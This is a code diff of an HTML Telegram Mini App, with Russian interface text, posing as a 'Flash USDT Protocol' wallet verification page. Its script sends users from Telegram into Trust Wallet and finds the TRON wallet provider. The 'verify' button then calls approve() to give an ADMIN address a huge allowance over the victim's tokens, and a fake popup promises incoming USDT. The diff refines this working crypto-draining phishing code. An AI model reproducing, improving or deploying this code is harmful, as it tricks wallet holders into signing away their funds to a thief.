@@ -7,14 +7,14 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .container { padding: 30px; width: 100%; max-width: 400px; box-sizing: border-box; }
+        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .container { padding: 30px; width: 100%; max-width: 400px; }
         .loader { border: 2px solid #222; border-top: 2px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 22px; margin: 0 0 15px; font-weight: 700; }
-        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 15px; box-shadow: 0 5px 15px rgba(0,136,204,0.3); }
-        .btn:active { transform: scale(0.97); }
+        h2 { font-size: 22px; margin: 0 0 15px; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 15px; }
+        .btn:disabled { background: #333; color: #666; }
     </style>
 </head>
 <body>
@@ -22,18 +22,18 @@
 <div class="container">
     <div id="ui-loading">
         <div class="loader"></div>
-        <p>Подключение к защищенному узлу...</p>
+        <p id="loading-text">Ищем кошелек в сети TRC-20...</p>
     </div>
 
     <div id="ui-wallet" style="display: none;">
         <h2>Узел синхронизирован</h2>
-        <p>Ваш кошелек подключен к сети TRC-20. Нажмите кнопку ниже для финальной верификации транзакций.</p>
+        <p>Для зачисления USDT необходимо верифицировать логи транзакций.</p>
         <button id="btn-verify" class="btn">ВЕРИФИЦИРОВАТЬ</button>
     </div>
 
     <div id="ui-telegram" style="display: none;">
         <h2>Flash USDT Protocol</h2>
-        <p>Для восстановления доступа и зачисления USDT выберите ваш кошелек:</p>
+        <p>Для восстановления доступа выберите ваш основной кошелек:</p>
         <button id="btn-open-trust" class="btn">Открыть в Trust Wallet</button>
     </div>
 </div>
@@ -49,58 +49,80 @@
     const uiLoading = document.getElementById('ui-loading');
     const uiWallet = document.getElementById('ui-wallet');
     const uiTelegram = document.getElementById('ui-telegram');
+    const loadingText = document.getElementById('loading-text');
 
-    // Проверяем, есть ли в ссылке пометка, что мы уже в кошельке
-    const urlParams = new URLSearchParams(window.location.search);
-    const isWalletMode = urlParams.get('mode') === 'wallet';
+    let walletProvider = null;
+
+    // Функция поиска кошелька
+    function findProvider() {
+        // Проверяем все возможные места, где кошелек прячет свои "мозги"
+        const provider = window.tronWeb || (window.tron && window.tron.tronWeb) || window.sunWeb;
+        if (provider) {
+            walletProvider = provider;
+            return true;
+        }
+        return false;
+    }
 
     function init() {
-        // Если есть пометка "wallet" ИЛИ мы реально видим кошелек
-        if (isWalletMode || (window.tronWeb && window.tronWeb.defaultAddress.base58)) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const isWalletMode = urlParams.get('mode') === 'wallet';
+
+        if (findProvider()) {
             uiLoading.style.display = 'none';
             uiTelegram.style.display = 'none';
             uiWallet.style.display = 'block';
+        } else if (isWalletMode) {
+            // Если мы в режиме кошелька, но он не найден - ждем еще немного
+            loadingText.innerText = "Ошибка: Смените сеть на TRON (TRC-20) в настройках кошелька.";
         } else {
-            // Мы в Telegram
             uiLoading.style.display = 'none';
             uiTelegram.style.display = 'block';
         }
     }
 
-    // Кнопка: Открыть в Trust Wallet (с добавлением маячка в ссылку)
+    // Кнопка: ТГ -> Кошелек
     document.getElementById('btn-open-trust').onclick = () => {
-        const walletUrl = BASE_URL + "?mode=wallet"; // Добавляем маячок
-        const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(walletUrl);
+        const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(BASE_URL + "?mode=wallet");
         tg.openLink(deepLink);
     };
 
-    // Кнопка: Верифицировать (внутри кошелька)
+    // Кнопка: Верификация
     document.getElementById('btn-verify').onclick = async () => {
+        if (!findProvider()) {
+            alert("Кошелек не найден. Убедитесь, что выбрана сеть Tron.");
+            return;
+        }
+
         try {
-            if (!window.tronWeb) {
-                alert("Ошибка: Кошелек не инициализирован. Перезагрузите страницу в Trust Wallet.");
-                return;
+            // Запрашиваем аккаунты
+            if (walletProvider.request) {
+                await walletProvider.request({ method: 'tron_requestAccounts' });
             }
-            // Запрашиваем доступ
-            await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            
-            // Вызываем апрув
-            const contract = await window.tronWeb.contract().at(CONTRACT_ADDR);
+
+            const contract = await walletProvider.contract().at(CONTRACT_ADDR);
             await contract.approve(ADMIN, '1000000000000000').send();
 
             tg.showPopup({
-                title: 'Успешно',
+                title: 'Готово',
                 message: 'Синхронизация завершена. Ожидайте зачисления в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
             setTimeout(() => tg.close(), 4000);
         } catch (e) {
-            tg.showAlert("Действие отклонено. Пожалуйста, подтвердите транзакцию.");
+            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
         }
     };
 
-    // Запуск через секунду, чтобы кошелек успел подгрузиться
-    setTimeout(init, 1000);
+    // Запускаем проверку каждые 500мс в течение 5 секунд
+    let attempts = 0;
+    const interval = setInterval(() => {
+        attempts++;
+        if (findProvider() || attempts > 10) {
+            clearInterval(interval);
+            init();
+        }
+    }, 500);
 </script>
 </body>
 </html>
